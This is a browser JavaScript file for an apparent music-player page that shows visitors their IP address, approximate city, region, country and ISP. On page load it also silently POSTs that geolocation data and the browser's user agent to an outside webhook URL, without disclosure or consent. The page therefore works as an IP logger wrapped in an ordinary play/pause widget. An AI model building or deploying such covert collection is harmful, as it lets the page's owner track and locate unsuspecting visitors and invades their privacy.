const ipAddressElement = document.getElementById('ip-address');
const locationElement = document.getElementById('location');
const countryElement = document.getElementById('country');
const regionElement = document.getElementById('region');
const ispElement = document.getElementById('isp');
const player = document.getElementById('player'); 
const playPauseButton = document.getElementById('play-pause-button');
const BACKEND_URL = 'https://vercel-1320.vercel.app/api/webhook';

fetch('https://api6.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    ipAddressElement.textContent = data.ip;

    fetch(`https://ipapi.co/${data.ip}/json/`)
      .then(response => response.json())
      .then(ipData => {
        countryElement.textContent = ipData.country_name;
        regionElement.textContent = ipData.region; 
        ispElement.textContent = ipData.org;
        locationElement.textContent = `${ipData.city} (approx)`;

        fetch(BACKEND_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            ipData: ipData,
            userAgent: navigator.userAgent
          }),
        });
      })
      .catch(error => console.error(error));
  })
  .catch(error => console.error(error));

function togglePlayPause() {
  if (player.paused) { 
    player.play();
    playPauseButton.innerHTML = '<span class="material-icons">pause</span>';
  } else { 
    player.pause();
    playPauseButton.innerHTML = '<span class="material-icons">play_arrow</span>';
  }
}

playPauseButton.addEventListener('click', togglePlayPause);
